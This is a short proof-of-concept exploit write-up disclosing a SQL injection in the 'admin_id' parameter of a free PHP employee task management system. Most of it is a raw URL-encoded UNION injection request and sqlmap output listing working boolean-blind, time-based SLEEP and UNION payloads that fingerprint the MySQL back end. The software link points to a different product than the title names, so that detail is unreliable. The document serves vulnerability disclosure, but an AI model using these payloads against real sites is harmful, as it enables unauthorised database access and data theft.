# Exploit Title: employee task management system - SQLi

### Date: 
> March 15th, 2024

### Author: 
> tht1997
### Vendor Homepage:
> https://www.sourcecodester.com

### Software Link:
> [employee task management system](https://www.sourcecodester.com/php/15371/auto-dealer-management-system-phpoop-free-source-code.html)
### Version:
> v 1.0
### URL:
> [/update-admin.php?admin_id=1](http://localhost/taskmatic/update-admin.php?admin_id=1)
### Proof of Concept:
Review source code
![SQL](https://github.com/tht1997/WhiteBox/blob/main/sourcecodester/isadmin.png?raw=true)
\
Step 1. Go to URL edit: http://localhost/taskmatic/update-admin.php?admin_id=1
\
Step 2. Run with sqlmap

```
GET /taskmatic/update-admin.php?admin_id=-5619%27%20UNION%20ALL%20SELECT%20CONCAT%280x7170716271%2C%28CASE%20WHEN%20%28VERSION%28%29%20LIKE%200x254d61726961444225%29%20THEN%201%20ELSE%200%20END%29%2C0x7176707071%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20- HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost/taskmatic/manage-admin.php
Cookie: PHPSESSID=au6ifo1ssaop7ilk8c4f09pj2j
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Connection: close
```

Step 3. sqlmap result

```
[20:03:10] [INFO] GET parameter 'admin_id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'admin_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:
---
Parameter: admin_id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: admin_id=1' AND 4823=4823 AND 'fHuK'='fHuK

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: admin_id=1' AND (SELECT 2812 FROM (SELECT(SLEEP(5)))yoFD) AND 'eLUj'='eLUj

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: admin_id=-5229' UNION ALL SELECT CONCAT(0x7170716271,0x684d74644f51547249684d4d6a4c52687374496a74464b7a64634664425751574f56575873794e50,0x7176707071),NULL,NULL,NULL,NULL,NULL,NULL-- -
---
[20:03:14] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.4.30, Apache 2.4.54
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
```
